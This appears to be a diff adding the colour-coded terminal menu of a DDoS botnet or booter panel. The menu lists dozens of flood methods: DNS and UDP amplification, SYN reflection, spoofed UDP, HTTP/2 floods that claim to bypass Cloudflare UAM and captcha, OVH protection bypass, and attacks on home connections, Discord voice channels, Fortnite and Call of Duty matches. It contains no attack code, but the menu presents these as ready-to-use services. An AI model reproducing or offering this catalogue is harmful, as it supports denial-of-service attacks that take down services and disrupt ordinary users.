@@ -1,0 +1,50 @@
+<<$clear>>[8;51;105t[38;2;255;255;255m[[38;2;96;179;250m User Data Protocol [38;2;255;255;255m][0m<<sleep(30)>>
+  │ gudp            [[38;2;250;204;17mPROT & UNPROT[0m] Large amplification of UDP & DNS with a large byte size<<sleep(30)>>
+  │ udpbypass       [[38;2;250;204;17mPROT & UNPROT[0m] Large randomized UDP data<<sleep(30)>>
+  │ ovh             [[38;2;250;204;17mPROT & UNPROT[0m] OVH 3 way handshake with SYN, ACK and SADP amplification (AMP)<<sleep(30)>>
+  │ syn             [[38;2;250;204;17mPROT & UNPROT[0m] High volume SYN attack, high pps, using reflections list<<sleep(30)>>
+  │ subnet          [[38;2;250;204;17mPROT & UNPROT[0m] Used to attack a whole network range<<sleep(30)>>
+  │ udp-bypassv2    [[38;2;250;204;17mPROT & UNPROT[0m] Spoofed UDP flood that has high bypass rate<<sleep(30)>>
+  │ holder          [[38;2;56;250;17mPROTECTED [0m] DNS & UDP amplification for holding unprotected internet protocols<<sleep(30)>>
+  │ dns-amp         [[38;2;250;204;17mPROT & UNPROT[0m] DNS Amplification for high gbp/s
+[38;2;255;255;255m[[38;2;96;179;250m Transmission Control Protocol [38;2;255;255;255m][0m<<sleep(30)>>
+  │ tcp-boom        [[38;2;56;250;17mPROTECTED [0m] TCP 3 way handshake designed for protected TCP ports<<sleep(30)>>
+  │ tcp-drop        [[38;2;56;250;17mPROTECTED [0m] TCP 3 way handshake designed for protected TCP ports<<sleep(30)>>
+  │ ssh             [[38;2;56;250;17mPROTECTED [0m] Putty SSH socket flood using legit SSH putty data  <<sleep(30)>>      
+  │ socket          [[38;2;56;250;17mPROTECTED [0m] TCP attack preventing a connection to a specific port, killing port<<sleep(30)>>
+[38;2;255;255;255m[[38;2;96;179;250m HTTP/S Vectors [38;2;255;255;255m][0m<<sleep(30)>>
+  │ tls             [[38;2;56;250;17mPROTECTED [0m] HTTP/2 Flood with TLS Queries & user agents, headers<<sleep(30)>>
+  │ cloudflare      [[38;2;56;250;17mPROTECTED [0m] Cloudflare bypass that bypasses UAM & captcha 
+  │ http            [[38;2;56;250;17mPROTECTED [0m] HTTP/2 Flood that bypasses captcha & UAM protection<<sleep(30)>>
+  │ https           [[38;2;56;250;17mPROTECTED [0m] HTTP/1 Universal HTTP flood<<sleep(30)>>
+  │ http-rapid      [[38;2;56;250;17mPROTECTED [0m] HTTP/1 Unversial flood with high requests per second (RP/S)<<sleep(30)>>
+  │ http-browser    [[38;2;56;250;17mPROTECTED [0m] Browser emulation flood for bypassing HTTPS protections<<sleep(30)>>
+[38;2;255;255;255m[[38;2;96;179;250m RAW Vectors [38;2;255;255;255m][0m<<sleep(30)>>
+  │ !syn            [[38;2;255;0;0mRAW[0m] Sends raw syn attack using bots<<sleep(30)>>
+  │ !udp            [[38;2;255;0;0mRAW[0m] Sends raw UDP attack using LEN=1400<<sleep(30)>>
+  │ !tcp            [[38;2;255;0;0mRAW[0m] RAW 3 way TCP attack<<sleep(30)>>
+  │ !http           [[38;2;255;0;0mRAW[0m] High volume RAW http flood, high bypass rate<<sleep(30)>>
+  │ !bypass         [[38;2;255;0;0mRAW[0m] High volume bypass flood<<sleep(30)>>
+  │ !http-raw       [[38;2;255;0;0mRAW[0m] RAW http flood, high rp/s<<sleep(30)>>
+  │ !websiteholder  [[38;2;255;0;0mRAW[0m] RAW http flood that is utilized as a holder<<sleep(30)>>
+[38;2;255;255;255m[[38;2;96;179;250m Star Vectors [38;2;255;255;255m][0m<<sleep(30)>>
+  │ udp-star        [[38;2;56;250;17mPROTECTED [0m] Custom UDP flood with high bypass and gbp/s<<sleep(30)>>
+  │ tcp-star        [[38;2;56;250;17mPROTECTED [0m] TCP flood with randomized packet<<sleep(30)>>
+  │ ovh-star        [[38;2;56;250;17mPROTECTED [0m] OVH-TCP flood to bypass server protection and game hostings<<sleep(30)>>
+  │ game-star       [[38;2;56;250;17mPROTECTED [0m] UDP & TCP mixed flood for game designed servers<<sleep(30)>>
+  │ syn-star        [[38;2;56;250;17mPROTECTED [0m] Basic SYN attack that utilizes a reflection list<<sleep(30)>>
+  │ http-star       [[38;2;56;250;17mPROTECTED [0m] HTTP/1 with higher requests per second (RP/S)<<sleep(30)>>
+[38;2;255;255;255m[[38;2;96;179;250m HEX Custom [38;2;255;255;255m][0m<<sleep(30)>>
+  │ http-hex        [[38;2;56;250;17mPROTECTED [0m] HTTP/1 Unversal HEX custom flood<<sleep(30)>>
+  │ cf-hex          [[38;2;56;250;17mPROTECTED [0m] Cloudflare bypass that bypasses UAM & captcha protection<<sleep(30)>>
+  │ udp-hex         [[38;2;56;250;17mPROTECTED [0m] Custom UDP flood<<sleep(30)>>
+  │ tcp-hex         [[38;2;56;250;17mPROTECTED [0m] Custom TCP flood<<sleep(30)>>
+  │ dns-hex         [[38;2;250;204;17mPROT & UNPROT[0m] DNS amplification for high gbp/s, using a relfection<<sleep(30)>>
+  │ syn-hex         [[38;2;56;250;17mPROTECTED [0m] High volume SYN attack for high PPS<<sleep(30)>>
+  │ ovh-hex         [[38;2;56;250;17mPROTECTED [0m] SADP, ACK & SYN flood bypassing OVH protection<<sleep(30)>>
+  │ game-hex        [[38;2;56;250;17mPROTECTED [0m] UDP & TCP flood with a custom payload for game servers<<sleep(30)>>
+[38;2;255;255;255m[[38;2;96;179;250m Miscellaneous [38;2;255;255;255m][0m<<sleep(30)>>
+  │ home            [[38;2;56;250;17mPROTECTED [0m] DNS amplification for home connections
+  │ discord         [[38;2;56;250;17mPROTECTED [0m] Discord voice channel attack sending encrypted traffic to lag voice
+  │ fortnite        [[38;2;56;250;17mPROTECTED [0m] UDP attack optimized to bypass fornite servers
+  │ cod-kill        [[38;2;56;250;17mPROTECTED [0m] Kills Call of Duty matches, high packet loss
